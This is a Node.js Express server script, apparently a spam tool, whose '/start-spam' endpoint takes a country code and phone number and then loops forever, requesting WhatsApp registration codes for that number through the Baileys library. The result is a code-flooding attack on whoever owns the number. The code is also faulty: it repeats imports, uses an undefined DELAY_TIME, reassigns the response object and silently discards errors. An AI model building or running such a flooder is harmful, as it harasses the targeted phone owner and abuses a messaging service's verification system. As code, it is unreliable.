import "./Maher-Zubair.js"
import express from 'express';
import pinoPretty from 'pino-pretty';
import open from 'open';
import pino from 'pino';
import path from 'path';
import fs from 'fs';
import { waitUntil } from 'wait-until-promise';
import open from 'open';
const {
        default: _makeWaSocket,
        makeWALegacySocket,
        proto,
        downloadContentFromMessage,
        jidDecode,
        areJidsSameUser,
        generateForwardMessageContent,
        generateWAMessageFromContent,
        WAMessageStubType,
        extractMessageContent,
        useMultiFileAuthState
    } = (await import('@whiskeysockets/baileys')).default
    import pino from 'pino';
import path from 'path';
import { fileURLToPath } from 'url';

const server = express();

const PORT = process.env.PORT || 8080;
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
server.use(express.static(path.join(__dirname)));
server.use(express.urlencoded({ extended: true })); // Add this line to parse URL-encoded bodies




server.post('/start-spam', async(req, res) => {
  const {  ddi, number } = req.body; // Extract values from request body

  // Check if all fields are filled
  if (  !ddi || !number ) {
    res.status(400).send('All fields are required');
    return;
  }

  // Hier können Sie den Spam-Prozess starten
  const { state, saveCreds } = await useMultiFileAuthState('.mm');
  const spam = _makeWaSocket({
    auth: state,
    mobile: true,
    logger: pino({ level: 'silent' })
  });

  while (true) {
    try {
      res = await spam.requestRegistrationCode({
        phoneNumber: '+' + ddi+number,
        phoneNumberCountryCode: ddi,
        phoneNumberNationalNumber: number,
        phoneNumberMobileCountryCode: 724
      });

      // Wait for the specified delay time before sending the next request
      await waitUntil(() => false, { timeout: DELAY_TIME });

    } catch (err) {
      
    }
  }
});


const logStream = fs.createWriteStream(path.join(__dirname, 'logs.txt'), { flags: 'a' }); // Erstellt einen Schreibstrom für eine Datei 'logs.txt' im aktuellen Verzeichnis

// Umlenken von stdout auf die Datei
process.stdout.write = logStream.write.bind(logStream);

// Nun werden alle Konsolenprotokolle in 'logs.txt' geschrieben


server.listen(PORT, () => {
        console.log(`Server is running on port ${PORT}`);
        open(`http://localhost:${PORT}`);
})